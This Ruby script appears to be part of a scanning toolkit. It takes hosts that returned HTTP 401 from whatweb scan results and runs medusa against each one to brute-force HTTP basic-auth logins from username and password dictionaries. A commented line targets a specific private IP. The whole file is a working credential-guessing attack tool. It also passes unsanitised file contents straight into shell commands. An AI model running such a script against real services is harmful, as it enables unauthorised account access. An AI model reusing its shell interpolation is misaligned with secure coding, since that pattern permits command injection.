#!/usr/bin/env ruby

#medusa -M http -h 10.99.184.116 -n 8888 -U ../../develop/masport/db/dict/user.txt -P ../../develop/masport/db/dict/pass.txt
input = '../db/medusa/url.txt'
filter= ' | grep -v 1999 | grep -v https'
cmd = "grep '\"http_status\":401' ../db/whatweb/* | awk -F '\"' '{print $4}' #{filter} > #{input}"
puts 'Running syscmd: '+cmd
result = `#{cmd}`

File.open(input).each do |line|
  line.chomp!
  line.gsub!('http://','')
  ary = line.split ':'
  ip   = ary[0]
  port = ary[1]
  if ip and port
    puts line
    cmd="medusa -M http -h #{ip} -n #{port} -U ../db/dict/user.txt -P ../db/dict/pass.txt"
    puts 'Running syscmd: '+cmd
    result = `#{cmd}`
    puts result
  end

  #if result and result.include? 'successfully'
  #  cmd="echo #{result} >> ../db/hydra/result.txt"
  #  puts 'Running syscmd: '+cmd
  #  `#{cmd}`
  #end
end

